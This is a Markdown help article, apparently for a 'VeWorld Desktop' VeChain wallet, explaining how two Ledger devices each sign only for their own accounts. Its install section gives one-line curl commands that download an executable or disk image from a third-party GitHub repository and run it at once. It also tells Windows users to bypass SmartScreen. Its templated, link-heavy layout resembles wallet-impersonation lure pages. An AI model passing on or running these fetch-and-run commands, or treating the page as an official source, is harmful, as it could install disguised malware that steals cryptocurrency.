![VeWorld Desktop](../assets/banner-article.png)

# Two VeChain Ledger Wallets, One VeWorld Desktop: Signing Authority

Each device signs only for addresses it derived

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> Every signature is approved on the device screen, so read it there rather than in the app window.

Two Ledger devices can both be added to VeWorld Desktop, and each one keeps its own keys and its own addresses. The wallet holds the view of both; the authority to sign stays on whichever device controls the account being used, so a signature request always resolves to one specific piece of hardware.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You own two devices, one for savings and one for daily use, and want both visible in the same app without merging them. Or you added a second device and now cannot tell which account needs which device attached.

| Setup | What the wallet shows | What signing requires |
|---|---|---|
| One device, several indexes | Several accounts, one owner | The same device, correct index |
| Two devices, one account each | Two accounts, different owners | The device that owns that account |
| Device lost, phrase restored | The same accounts on new hardware | The new device with the same phrase |
| Device sold, phrase kept | Accounts still reachable | A device carrying that phrase |

## Why it happens

A <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger device</a> is not a wallet in the software sense; it is a signing device with its own <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a>. Everything it controls derives from that phrase, and the addresses it exposes are a function of that phrase plus an index. Two devices with different phrases therefore control two unrelated sets of addresses, even when both are connected to the same application.

The application's role is bookkeeping. It stores which accounts exist, which device each came from, and what the balances are. It cannot sign for either device, and it cannot move authority between them. Connecting device A does nothing for an account that belongs to device B, which is why a signature request on the wrong account produces a prompt the connected device will not answer.

That separation is useful rather than awkward. A device kept offline for a large balance and a second device used for routine transactions give two independent failure domains: losing the daily device does not expose the savings account, and a compromise on the daily machine does not touch the other. Both remain recoverable from their own phrases, which is the property that makes the arrangement safe rather than merely tidy.

The practical cost is labelling. Two accounts with similar balances are indistinguishable at a glance, and approving on the wrong device is a mistake the interface cannot prevent. Naming each account after the device that owns it, and confirming the device screen, closes that gap.

## Fix

1. Connect the first device, open the VeChain app, and add its account.
2. Rename the account so the device it belongs to is obvious, before adding the second.
3. Disconnect the first device, connect the second, and repeat the account flow.
4. Check both addresses appear in the account list with the balances you expect.
5. To sign, select the account first and then connect the device that owns it; the prompt appears on that device only.
6. Confirm the address on the device screen matches the account you selected before approving.

## If that did not work

If a signature prompt never appears, the wrong device is connected. Switch accounts rather than unplugging and replugging blindly: the account tells you which device is required.

If both devices appear to control the same address, one of them was restored from the same phrase. That is a legitimate setup, and it means either device can sign for those accounts; it also means the phrase is the single point of failure for both.

If an account cannot be signed at all, the device holding it may have been reset. Restoring its phrase on replacement hardware reproduces the same addresses and the same authority.

## Prevention

- Name accounts after their devices, so selection is a decision rather than a guess.
- Keep the two phrases recorded separately, never in the same place.
- Confirm the address on the device screen for every first signature on an account.
- Never enter either recovery phrase into the app or a website; hardware signing exists so it is not needed anywhere else.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Can one wallet hold accounts from two different Ledgers?

Yes. Each account records the device it came from, and the wallet shows them together. Signing still requires the matching device.

### Does connecting a second device expose the first account?

No. A device answers only for accounts derived from its own phrase, and it cannot sign for another device's address.

### What happens if I connect the wrong device?

The app waits for a confirmation that never comes, because the device has no key for that account. Select the right account instead of retrying.

### Can two devices share one phrase?

Yes, by restoring the same phrase on both, which makes either device able to sign for the same accounts. It also removes the isolation that two devices otherwise provide.

### Is it worth using two devices?

For a large balance and a small one, yes: separate phrases mean separate failure domains, and each stays recoverable on its own.

### Can I move an account from one device to another?

Not directly. Authority follows the phrase, so the only way to move an account is to restore its phrase on the other device, which makes both devices able to sign for it. If the goal is separation rather than migration, create a fresh account on the second device instead.

### What happens if one device is lost while both are in use?

Only the accounts belonging to the lost device are affected, and only until its phrase is restored on replacement hardware. The other device keeps working throughout, which is the practical reason people split a large balance and a small one across two phrases.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Pairing the first Ledger](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [What to do when a device is not detected](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md)
- [Whether hardware can still lose funds](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [Signing when a setting changes mid-flow](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-app-settings-veworld-desktop.md)
- [How self-custody protects a balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)